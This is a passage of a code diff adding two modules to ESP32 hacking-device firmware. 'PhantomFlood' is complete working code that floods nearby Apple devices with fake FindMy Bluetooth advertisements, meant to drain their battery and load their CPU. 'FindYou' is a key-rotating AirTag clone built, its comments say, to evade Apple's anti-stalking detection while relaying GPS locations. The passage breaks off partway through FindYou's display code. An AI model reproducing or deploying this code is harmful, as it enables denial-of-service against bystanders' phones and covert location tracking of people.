@@ -3831,6 +3831,2160 @@ void cleanup() {
 
 
 // ═══════════════════════════════════════════════════════════════════════════
+// PHANTOM FLOOD - Apple FindMy Offline Finding BLE Flood
+// Broadcasts fake FindMy OF advertisements with random 28-byte "public keys"
+// Each key is unique → iPhones process every advert as a distinct tracker
+// Causes background CPU load, battery drain, junk data uploads on Apple devices
+// Payload: [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, status, PK[6..27], hint, 0x00]
+// MAC = PK[0..5] with PK[0] |= 0xC0 (BLE random static address)
+//
+// DRAM-lean design: no log buffer, no EQ heat array, no pointer arrays.
+// All animations computed from millis(). Total static DRAM ~40 bytes.
+// ═══════════════════════════════════════════════════════════════════════════
+
+namespace PhantomFlood {
+
+// ═══════════════════════════════════════════════════════════════════════════
+// STATE VARIABLES — minimal DRAM footprint
+// ═══════════════════════════════════════════════════════════════════════════
+
+static bool initialized = false;
+static volatile bool flooding = false;
+static bool exitRequested = false;
+
+static volatile uint32_t phantomCount = 0;
+static volatile uint32_t rateWindowCount = 0;
+static volatile uint16_t currentRate = 0;
+
+// Last broadcast MAC for display (written by Core 0, read by Core 1)
+static volatile uint8_t lastMAC[3] = {0};
+static volatile uint8_t lastPK[3] = {0};
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DUAL-CORE TASK MANAGEMENT
+// ═══════════════════════════════════════════════════════════════════════════
+
+static TaskHandle_t floodTaskHandle = NULL;
+static volatile bool floodTaskRunning = false;
+
+static unsigned long pfLastDisplayUpdate = 0;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// HELPER: gradient color from cyan to hot pink (ratio 0.0 → 1.0)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static uint16_t pfGradientColor(float ratio) {
+    if (ratio > 1.0f) ratio = 1.0f;
+    if (ratio < 0.0f) ratio = 0.0f;
+    uint8_t r = (uint8_t)(ratio * 255);
+    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
+    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
+    return tft.color565(r, g, b);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UI DRAWING — HaleHound Visual Suite (zero-buffer, computed animations)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void pfDrawIconBar() {
+    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
+    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
+    // Back icon
+    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+    // Toggle icon
+    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
+                   flooding ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
+    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
+}
+
+static void pfDrawHeader() {
+    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);
+
+    // Skull watermark behind header
+    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));
+
+    // Title — Nosifer 10pt with glitch effect
+    drawGlitchText(SCALE_Y(60), "PHANTOM", &Nosifer_Regular10pt7b);
+
+    // Status — pulsing when active
+    tft.setTextSize(1);
+    if (flooding) {
+        bool blink = (millis() / 300) & 1;
+        uint16_t statusColor = blink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
+        tft.setTextColor(statusColor, TFT_BLACK);
+        tft.setCursor(80, 68);
+        tft.print(">> FLOODING <<");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(95, 68);
+        tft.print("- IDLE -    ");
+    }
+
+    // FindMy protocol label in double-border frame
+    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
+    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(10, 78);
+    tft.print(" FindMy OF Flood");
+
+    // Phantom count on right side
+    tft.setCursor(155, 78);
+    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+    char cBuf[16];
+    snprintf(cBuf, sizeof(cBuf), "#%lu", phantomCount);
+    tft.print(cBuf);
+
+    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// ACTIVITY DISPLAY — Computed from millis() and counters, NO state arrays
+// Shows last broadcast info + animated activity bars
+// Anti-flicker: static text drawn once, only dynamic lines overwrite in-place
+// ═══════════════════════════════════════════════════════════════════════════
+
+#define PF_INFO_Y 95
+#define PF_INFO_H (SCREEN_HEIGHT - 80 - PF_INFO_Y)
+#define PF_BAR_Y (PF_INFO_Y + 68)
+#define PF_BAR_TOTAL_W (SCREEN_WIDTH - 24)
+#define PF_NUM_BARS 16
+
+static bool pfStaticDrawn = false;    // Static text drawn once flag
+static bool pfLastFloodState = false; // Track state transitions
+
+// Draw static text (only once, or on state change)
+static void pfDrawStaticInfo() {
+    // Clear the text area only (not EQ bars)
+    tft.fillRect(0, PF_INFO_Y, SCREEN_WIDTH, PF_BAR_Y - PF_INFO_Y - 2, TFT_BLACK);
+
+    // Subtle skull watermark
+    tft.drawBitmap(112, PF_INFO_Y + 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));
+
+    tft.setTextSize(1);
+
+    // Line 1: Module info (always the same)
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(3, PF_INFO_Y);
+    tft.print("[*] FindMy Offline Finding");
+
+    // Line 2: Attack description (always the same)
+    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+    tft.setCursor(3, PF_INFO_Y + 12);
+    tft.print("[*] Fake tracker key flood");
+
+    // Line 3: Status (changes on state toggle)
+    if (flooding) {
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.setCursor(3, PF_INFO_Y + 28);
+        tft.print("[!] TRANSMITTING        ");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(3, PF_INFO_Y + 28);
+        tft.print("[*] Tap play to start   ");
+    }
+
+    // EQ bar frame (static)
+    tft.drawRect(11, PF_BAR_Y - 1, PF_BAR_TOTAL_W + 2, 20, HALEHOUND_GUNMETAL);
+
+    pfStaticDrawn = true;
+    pfLastFloodState = flooding;
+}
+
+// Draw dynamic content only (called at 10fps)
+static void pfDrawActivity() {
+    // Redraw static text on first call or state change
+    if (!pfStaticDrawn || (flooding != pfLastFloodState)) {
+        pfDrawStaticInfo();
+    }
+
+    tft.setTextSize(1);
+
+    if (flooding) {
+        // Line 4: Last broadcast — overwrite in-place (fixed-width format, no clear needed)
+        char buf[38];
+        snprintf(buf, sizeof(buf), "[+] PK:%02X%02X%02X -> %02X:%02X:%02X",
+                 lastPK[0], lastPK[1], lastPK[2], lastMAC[0], lastMAC[1], lastMAC[2]);
+        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+        tft.setCursor(3, PF_INFO_Y + 40);
+        tft.print(buf);
+
+        // Line 5: Phantoms sent — pad to fixed width to overwrite old digits
+        snprintf(buf, sizeof(buf), "[+] Phantoms: %-8lu(%d/s)  ", phantomCount, currentRate);
+        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+        tft.setCursor(3, PF_INFO_Y + 52);
+        tft.print(buf);
+
+        // Animated activity bars — clear each bar column individually, not whole area
+        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
+        unsigned long t = millis();
+
+        for (int i = 0; i < PF_NUM_BARS; i++) {
+            int x = 12 + (i * barW);
+
+            // Clear this bar's column
+            tft.fillRect(x + 1, PF_BAR_Y, barW - 2, 18, TFT_BLACK);
+
+            // Pseudo-random bar height from time + position
+            int seed = (int)((t / 80) + i * 37) % 17;
+            int barH = 4 + seed;
+            if (barH > 16) barH = 16;
+            int by = PF_BAR_Y + 18 - barH;
+
+            float ratio = (float)i / (float)(PF_NUM_BARS - 1);
+            uint16_t color = pfGradientColor(ratio);
+            tft.fillRect(x + 1, by, barW - 2, barH, color);
+        }
+    } else {
+        // Standby — clear dynamic text lines
+        tft.fillRect(0, PF_INFO_Y + 40, SCREEN_WIDTH, 24, TFT_BLACK);
+
+        // Standby bars (only redraw if just transitioned to idle)
+        int barW = PF_BAR_TOTAL_W / PF_NUM_BARS;
+        tft.fillRect(12, PF_BAR_Y, PF_BAR_TOTAL_W, 18, TFT_BLACK);
+        for (int i = 0; i < PF_NUM_BARS; i++) {
+            int x = 12 + (i * barW);
+            int barH = 3 + (i % 3);
+            tft.fillRect(x + 1, PF_BAR_Y + 18 - barH, barW - 2, barH, HALEHOUND_GUNMETAL);
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// SKULL ROW — 8 custom Jesse skulls, wave animation, inline references
+// ═══════════════════════════════════════════════════════════════════════════
+
+#define PF_SKULL_Y (SCREEN_HEIGHT - 48)
+#define PF_SKULL_NUM 8
+
+// PROGMEM skull icon table (pointers live in flash, not DRAM)
+static const unsigned char* const pfSkulls[PF_SKULL_NUM] PROGMEM = {
+    bitmap_icon_skull_wifi,
+    bitmap_icon_skull_bluetooth,
+    bitmap_icon_skull_jammer,
+    bitmap_icon_skull_subghz,
+    bitmap_icon_skull_ir,
+    bitmap_icon_skull_tools,
+    bitmap_icon_skull_setting,
+    bitmap_icon_skull_about
+};
+
+static void pfDrawSkulls() {
+    int skullStartX = 10;
+    int skullSpacing = (SCREEN_WIDTH - 20) / PF_SKULL_NUM;
+    int frame = (int)(millis() / 120);  // Computed frame, no state var
+
+    for (int i = 0; i < PF_SKULL_NUM; i++) {
+        int x = skullStartX + (i * skullSpacing);
+        tft.fillRect(x, PF_SKULL_Y, 16, 16, TFT_BLACK);
+
+        uint16_t color;
+        if (flooding) {
+            int phase = (frame + i) % 8;
+            if (phase < 4) {
+                color = pfGradientColor(phase / 3.0f);
+            } else {
+                float ratio = (phase - 4) / 3.0f;
+                uint8_t r = 255 - (uint8_t)(ratio * 255);
+                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
+                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
+                color = tft.color565(r, g, b);
+            }
+        } else {
+            color = HALEHOUND_GUNMETAL;
+        }
+
+        const unsigned char* icon = (const unsigned char*)pgm_read_ptr(&pfSkulls[i]);
+        tft.drawBitmap(x, PF_SKULL_Y, icon, 16, 16, color);
+    }
+
+    // TX/OFF label
+    int labelX = skullStartX + (PF_SKULL_NUM * skullSpacing) + 5;
+    tft.fillRect(labelX - 5, PF_SKULL_Y, 50, 16, TFT_BLACK);
+    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setTextSize(1);
+    tft.setCursor(labelX, PF_SKULL_Y + 4);
+    tft.print(flooding ? "TX!" : "OFF");
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// COUNTER BAR — Gradient progress bar + rate display
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void pfDrawCounter() {
+    int counterY = SCREEN_HEIGHT - 30;
+    tft.fillRect(0, counterY, SCREEN_WIDTH, 25, TFT_BLACK);
+
+    int barX = 10;
+    int barY = counterY + 2;
+    int barW = SCALE_W(140);
+    int barH = 10;
+
+    tft.drawRoundRect(barX - 1, barY - 1, barW + 2, barH + 2, 2, HALEHOUND_MAGENTA);
+    tft.fillRoundRect(barX, barY, barW, barH, 1, HALEHOUND_DARK);
+
+    float fillPct = (currentRate > 0) ? (float)currentRate / 30.0f : 0.0f;
+    if (fillPct > 1.0f) fillPct = 1.0f;
+    int fillW = (int)(fillPct * barW);
+    if (fillW > 0) {
+        for (int px = 0; px < fillW; px++) {
+            float ratio = (float)px / (float)barW;
+            uint16_t c = pfGradientColor(ratio);
+            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
+        }
+    }
+
+    tft.setTextSize(1);
+    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
+    char cntBuf[12];
+    snprintf(cntBuf, sizeof(cntBuf), "%lu", phantomCount);
+    tft.setCursor(barX + 4, barY + 1);
+    tft.print(cntBuf);
+
+    tft.setTextColor(flooding ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
+    tft.setCursor(SCALE_X(160), counterY + 3);
+    tft.printf("%d phn/s", currentRate);
+
+    if (flooding) {
+        tft.drawBitmap(SCALE_X(220), counterY + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FINDMY OF PAYLOAD BUILDER — Stack-only, zero heap allocation
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void buildPhantomPayload(uint8_t mac[6], uint8_t payload[31]) {
+    uint8_t pk[28];
+    esp_fill_random(pk, 28);
+
+    memcpy(mac, pk, 6);
+    mac[0] |= 0xC0;
+
+    payload[0]  = 0x1E;  // AD Length (30 bytes follow)
+    payload[1]  = 0xFF;  // Manufacturer Specific Data
+    payload[2]  = 0x4C;  // Apple Inc (low byte)
+    payload[3]  = 0x00;  // Apple Inc (high byte)
+    payload[4]  = 0x12;  // FindMy OF type
+    payload[5]  = 0x19;  // OF data length (25 bytes)
+    payload[6]  = 0x00;  // Status byte (maintained, full battery)
+    memcpy(&payload[7], &pk[6], 22);
+    payload[29] = pk[0] >> 6;  // Hint
+    payload[30] = 0x00;        // Padding
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// BROADCAST ENGINE — Raw ESP-IDF cycle (same proven pattern as BLE Spoofer)
+// stop → setRandAddr → configDataRaw → start → delay → stop
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void doPhantomBroadcast() {
+    esp_ble_gap_stop_advertising();
+
+    uint8_t mac[6];
+    uint8_t payload[31];
+    buildPhantomPayload(mac, payload);
+
+    esp_ble_gap_set_rand_addr(mac);
+    esp_ble_gap_config_adv_data_raw(payload, 31);
+    delay(1);
+
+    // Adv params on stack — ESP-IDF copies internally
+    static const esp_ble_adv_params_t advP = {
+        .adv_int_min = 0x20,
+        .adv_int_max = 0x20,
+        .adv_type = ADV_TYPE_NONCONN_IND,
+        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
+        .channel_map = ADV_CHNL_ALL,
+        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+    };
+    esp_ble_gap_start_advertising((esp_ble_adv_params_t*)&advP);
+
+    delay(20);
+    esp_ble_gap_stop_advertising();
+
+    phantomCount++;
+    rateWindowCount++;
+
+    // Store last MAC/PK for display (volatile, lock-free)
+    lastMAC[0] = mac[0]; lastMAC[1] = mac[1]; lastMAC[2] = mac[2];
+    lastPK[0] = payload[7]; lastPK[1] = payload[8]; lastPK[2] = payload[9];
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CORE 0 FLOOD TASK
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void floodTxTask(void* param) {
+    floodTaskRunning = true;
+    unsigned long rateStart = millis();
+
+    while (flooding) {
+        doPhantomBroadcast();
+
+        unsigned long now = millis();
+        if (now - rateStart >= 1000) {
+            currentRate = (uint16_t)rateWindowCount;
+            rateWindowCount = 0;
+            rateStart = now;
+        }
+
+        vTaskDelay(1);
+    }
+
+    floodTaskRunning = false;
+    vTaskDelete(NULL);
+}
+
+static void startFloodTask() {
+    if (floodTaskHandle != NULL) return;
+    xTaskCreatePinnedToCore(floodTxTask, "pfFlood", 4096, NULL, 1, &floodTaskHandle, 0);
+}
+
+static void stopFloodTask() {
+    flooding = false;
+    if (floodTaskHandle == NULL) return;
+
+    unsigned long start = millis();
+    while (floodTaskRunning && (millis() - start < 500)) {
+        delay(10);
+    }
+
+    if (floodTaskRunning) {
+        vTaskDelete(floodTaskHandle);
+    }
+
+    floodTaskHandle = NULL;
+    floodTaskRunning = false;
+    esp_ble_gap_stop_advertising();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// START / STOP / TOGGLE
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void startFlood() {
+    flooding = true;
+    rateWindowCount = 0;
+    pfDrawIconBar();
+    pfDrawHeader();
+    startFloodTask();
+
+    #if CYD_DEBUG
+    Serial.println("[PHANTOM] Started (Core 0)");
+    #endif
+}
+
+static void stopFlood() {
+    stopFloodTask();
+    pfDrawIconBar();
+    pfDrawHeader();
+
+    #if CYD_DEBUG
+    Serial.println("[PHANTOM] Stopped");
+    #endif
+}
+
+static void toggleFlood() {
+    if (flooding) stopFlood(); else startFlood();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PUBLIC FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════════
+
+void setup() {
+    if (initialized) return;
+
+    #if CYD_DEBUG
+    Serial.println("[PHANTOM] Initializing Phantom Flood...");
+    #endif
+
+    tft.fillScreen(HALEHOUND_BLACK);
+    drawStatusBar();
+
+    WiFi.mode(WIFI_OFF);
+    delay(200);
+
+    releaseClassicBtMemory();
+    BLEDevice::init("HaleHound");
+    delay(150);
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
+    Serial.println("[PHANTOM] BLE stack initialized, max TX power set");
+
+    flooding = false;
+    exitRequested = false;
+    phantomCount = 0;
+    currentRate = 0;
+    rateWindowCount = 0;
+    floodTaskHandle = NULL;
+    floodTaskRunning = false;
+    pfStaticDrawn = false;
+    pfLastFloodState = false;
+
+    pfDrawIconBar();
+    pfDrawHeader();
+    pfDrawActivity();
+    pfDrawSkulls();
+    pfDrawCounter();
+
+    pfLastDisplayUpdate = millis();
+    initialized = true;
+
+    #if CYD_DEBUG
+    Serial.println("[PHANTOM] Ready");
+    #endif
+}
+
+void loop() {
+    if (!initialized) return;
+
+    touchButtonsUpdate();
+
+    uint16_t tx, ty;
+    if (getTouchPoint(&tx, &ty)) {
+        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
+            waitForTouchRelease();
+
+            if (tx >= 5 && tx <= 30) {
+                if (flooding) stopFlood();
+                exitRequested = true;
+                return;
+            }
+            else if (tx >= 50 && tx <= 80) {
+                toggleFlood();
+                return;
+            }
+        }
+    }
+
+    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+        if (flooding) stopFlood();
+        exitRequested = true;
+        return;
+    }
+
+    if (buttonPressed(BTN_SELECT)) toggleFlood();
+
+    yield();
+
+    if (millis() - pfLastDisplayUpdate >= 100) {
+        pfDrawActivity();
+        pfDrawSkulls();
+        pfDrawCounter();
+        pfLastDisplayUpdate = millis();
+    }
+}
+
+bool isExitRequested() {
+    return exitRequested;
+}
+
+void cleanup() {
+    stopFloodTask();
+    BLEDevice::deinit(false);
+
+    flooding = false;
+    initialized = false;
+    exitRequested = false;
+    pfStaticDrawn = false;
+
+    #if CYD_DEBUG
+    Serial.println("[PHANTOM] Cleanup complete");
+    #endif
+}
+
+}  // namespace PhantomFlood
+
+
+// ═══════════════════════════════════════════════════════════════════════════
+// FIND YOU - Stealth AirTag Clone (P-224 EC Key Rotation)
+// Broadcasts real FindMy OF advertisements using pre-generated P-224 keypairs
+// Each key rotates every 15-120s — below Apple's anti-stalking detection window
+// Owner retrieves GPS locations with matching private keys via macless-haystack
+// Based on Positive Security "Find You" research (PoPETs 2021 / ACM WiSec 2021)
+//
+// KEY DIFFERENCE from PhantomFlood:
+//   PhantomFlood = random throwaway keys (DoS/confusion — nobody can retrieve locations)
+//   Find You     = real P-224 EC keypairs (owner holds matching private keys → location retrieval)
+//
+// Payload format: identical FindMy OF (0x4C/0x00/0x12/0x19)
+// Key source:     findyou_keys.h — 2000 × 28-byte P-224 public key X-coordinates (PROGMEM)
+// Key rotation:   configurable 15/30/60/120 seconds (default 30s)
+// Detection:      2000 keys × 30s = ~16.7 hours per full cycle (below Apple's 8hr window)
+// ═══════════════════════════════════════════════════════════════════════════
+
+#include "findyou_keys.h"
+
+namespace FindYou {
+
+// ═══════════════════════════════════════════════════════════════════════════
+// STATE — heap-allocated via FyState*, freed on cleanup
+// ═══════════════════════════════════════════════════════════════════════════
+
+struct FyState {
+    uint16_t      keyIndex;           // Current key (0 to FINDYOU_KEY_COUNT-1)
+    uint8_t       rotationSecs;       // Active rotation interval (15, 30, 60, or 120)
+    uint8_t       rotationOptIdx;     // Index into rotation options array
+    unsigned long rotationStart;      // millis() when current key started broadcasting
+    volatile bool broadcasting;       // BLE advertising active
+    volatile bool taskRunning;        // Core 0 task alive
+    TaskHandle_t  taskHandle;         // FreeRTOS task handle
+    volatile uint32_t totalKeys;      // Keys broadcast so far (lifetime counter)
+    uint32_t      uptimeStart;        // millis() at module start
+    volatile uint8_t lastMAC[3];      // Last broadcast MAC (lock-free IPC for display)
+    volatile uint8_t lastPK[3];       // Last broadcast PK prefix (lock-free IPC)
+    bool          initialized;
+    bool          exitRequested;
+    bool          staticDrawn;        // Static UI elements drawn flag
+    bool          lastBroadcastState; // Track state transitions for redraw
+    unsigned long lastDisplayUpdate;  // 10Hz display refresh timer
+    unsigned long lastIconTap;        // Debounce for icon bar taps
+};
+
+static FyState* S = nullptr;
+
+// Rotation interval options
+static const uint8_t FY_ROTATION_OPTS[] = { 15, 30, 60, 120 };
+static const uint8_t FY_ROTATION_COUNT  = 4;
+
+// UI layout constants
+#define FY_INFO_Y       95
+#define FY_BAR_Y        (FY_INFO_Y + 68)
+#define FY_BAR_TOTAL_W  (SCREEN_WIDTH - 24)
+#define FY_NUM_BARS     16
+#define FY_SKULL_Y      (SCREEN_HEIGHT - 48)
+#define FY_SKULL_NUM    8
+
+// ═══════════════════════════════════════════════════════════════════════════
+// GRADIENT & DRAW HELPERS
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Green-to-cyan gradient (stealth theme — differentiate from PhantomFlood's pink)
+static uint16_t fyGradientColor(float ratio) {
+    if (ratio > 1.0f) ratio = 1.0f;
+    if (ratio < 0.0f) ratio = 0.0f;
+    uint8_t r = (uint8_t)(ratio * 80);
+    uint8_t g = 207 - (uint8_t)(ratio * (207 - 180));
+    uint8_t b = 255 - (uint8_t)(ratio * (255 - 100));
+    return tft.color565(r, g, b);
+}
+
+static void fyDrawIconBar() {
+    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
+    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
+    // Back icon
+    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
+    // Play/Stop toggle
+    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
+                   (S && S->broadcasting) ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA);
+    // Rotation interval indicator
+    if (S) {
+        tft.setTextSize(1);
+        tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_GUNMETAL);
+        tft.setCursor(110, ICON_BAR_Y + 4);
+        char rBuf[8];
+        snprintf(rBuf, sizeof(rBuf), "%ds", S->rotationSecs);
+        tft.print(rBuf);
+    }
+    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
+}
+
+static void fyDrawHeader() {
+    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);
+
+    // Skull watermark behind header
+    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));
+
+    // Title — Nosifer 10pt with glitch effect
+    drawGlitchText(SCALE_Y(60), "FIND YOU", &Nosifer_Regular10pt7b);
+
+    // Status — pulsing when active
+    tft.setTextSize(1);
+    if (S && S->broadcasting) {
+        bool blink = (millis() / 300) & 1;
+        uint16_t statusColor = blink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
+        tft.setTextColor(statusColor, TFT_BLACK);
+        tft.setCursor(72, 68);
+        tft.print(">> TRACKING <<");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(95, 68);
+        tft.print("- IDLE -    ");
+    }
+
+    // FindMy protocol label in double-border frame
+    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
+    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(10, 78);
+    tft.print(" FindMy OF Clone");
+
+    // Key index on right side
+    if (S) {
+        tft.setCursor(155, 78);
+        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+        char cBuf[16];
+        snprintf(cBuf, sizeof(cBuf), "K%u/%u", S->keyIndex, FINDYOU_KEY_COUNT);
+        tft.print(cBuf);
+    }
+
+    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// STATIC INFO (drawn once or on state change)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void fyDrawStaticInfo() {
+    tft.fillRect(0, FY_INFO_Y, SCREEN_WIDTH, FY_BAR_Y - FY_INFO_Y - 2, TFT_BLACK);
+
+    // Subtle skull watermark
+    tft.drawBitmap(112, FY_INFO_Y + 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));
+
+    tft.setTextSize(1);
+
+    // Line 1: Module info
+    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+    tft.setCursor(3, FY_INFO_Y);
+    tft.print("[*] FindMy Stealth Clone");
+
+    // Line 2: Key info
+    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+    tft.setCursor(3, FY_INFO_Y + 12);
+    char keyBuf[36];
+    snprintf(keyBuf, sizeof(keyBuf), "[*] P-224 keys: %u loaded", FINDYOU_KEY_COUNT);
+    tft.print(keyBuf);
+
+    // Line 3: Status
+    if (S && S->broadcasting) {
+        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
+        tft.setCursor(3, FY_INFO_Y + 28);
+        tft.print("[!] BROADCASTING        ");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
+        tft.setCursor(3, FY_INFO_Y + 28);
+        tft.print("[*] Tap play to start   ");
+    }
+
+    // EQ bar frame
+    tft.drawRect(11, FY_BAR_Y - 1, FY_BAR_TOTAL_W + 2, 20, HALEHOUND_GUNMETAL);
+
+    if (S) {
+        S->staticDrawn = true;
+        S->lastBroadcastState = S->broadcasting;
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DYNAMIC ACTIVITY (10Hz refresh)
+// ═══════════════════════════════════════════════════════════════════════════
+
+static void fyDrawActivity() {
+    if (!S) return;
+
+    // Redraw static text on first call or state change
+    if (!S->staticDrawn || (S->broadcasting != S->lastBroadcastState)) {
+        fyDrawStaticInfo();
+    }
+
+    tft.setTextSize(1);
+
+    if (S->broadcasting) {
+        // Line 4: Current key + MAC
+        char buf[38];
+        snprintf(buf, sizeof(buf), "[+] PK:%02X%02X%02X -> %02X:%02X:%02X",
+                 S->lastPK[0], S->lastPK[1], S->lastPK[2],
+                 S->lastMAC[0], S->lastMAC[1], S->lastMAC[2]);
+        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
+        tft.setCursor(3, FY_INFO_Y + 40);
+        tft.print(buf);
+
+        // Line 5: Key index + rotation countdown
+        unsigned long elapsed = millis() - S->rotationStart;
+        unsigned long remaining = 0;
+        if (elapsed < (unsigned long)S->rotationSecs * 1000UL) {
+            remaining = ((unsigned long)S->rotationSecs * 1000UL - elapsed) / 1000UL;
+        }
+        snprintf(buf, sizeof(buf), "[+] Key %u  rot:%lus  #%-5lu",
+                 S->keyIndex, remaining, S->totalKeys);
+        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
+        tft.setCursor(3, FY_INFO_Y + 52);
+        tft.print(buf);
+
+        // Rotation progress bar inside EQ frame
+        int barW = FY_BAR_TOTAL_W / FY_NUM_BARS;
+        float rotPct = (float)elapsed / ((float)S->rotationSecs * 1000.0f);
+        if (rotPct > 1.0f) rotPct = 1.0f;
+        int fillBars = (int)(rotPct * FY_NUM_BARS);
+
+        for (int i = 0; i < FY_NUM_BARS; i++) {
+            int x = 12 + (i * barW);
+            tft.fillRect(x + 1, FY_BAR_Y, barW - 2, 18, TFT_BLACK);
+
+            if (i < fillBars) {
+                // Filled — gradient bar showing rotation progress
+                int barH = 6 + ((millis() / 80 + i * 37) % 11);
+                if (barH > 16) barH = 16;
+                int by = FY_BAR_Y + 18 - barH;
+                float ratio = (float)i / (float)(FY_NUM_BARS - 1);
+                uint16_t color = fyGradientColor(ratio);
+                tft.fillRect(x + 1, by, barW - 2, barH, color);
+            } else if (i == fillBars) {
+                // Current bar — pulsing
+                int barH = 4 + ((millis() / 60) % 8);
+                int by = FY_BAR_Y + 18 - barH;
+                tft.fillRect(x + 1, by, barW - 2, barH, HALEHOUND_HOTPINK);
+            } else {
+                // Unfilled — dim stub
+                tft.fillRect(x + 1, FY_BAR_Y + 15, barW - 2, 3, HALEHOUND_GUNMETAL);
+            }
+        }
+    } else {
